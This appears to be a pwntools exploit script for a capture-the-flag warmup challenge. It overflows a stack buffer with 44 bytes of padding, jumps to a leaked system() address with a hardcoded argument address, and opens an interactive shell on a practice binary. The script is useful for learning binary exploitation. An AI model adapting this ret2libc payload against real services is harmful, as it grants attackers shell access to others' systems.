#!/usr/bin/python3
import pwn
# run straight
e = pwn.context.binary = pwn.ELF("./target")

#p = pwn.connect("warmup.pwn.site","5005")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py\n"
        +"\nbreak *system"
        +"\nc")
payload= b"A"*44
buf = p.readuntil(b">")
easy_addr = int(buf.split(b"system @ ")[1][:-1], 0)

print(hex(easy_addr))
easy_addr = pwn.p32(easy_addr)
payload += easy_addr
payload+=pwn.p32(0)
payload+= pwn.p32(0xf7dbd0d5)


p.sendline(payload)
p.interactive()
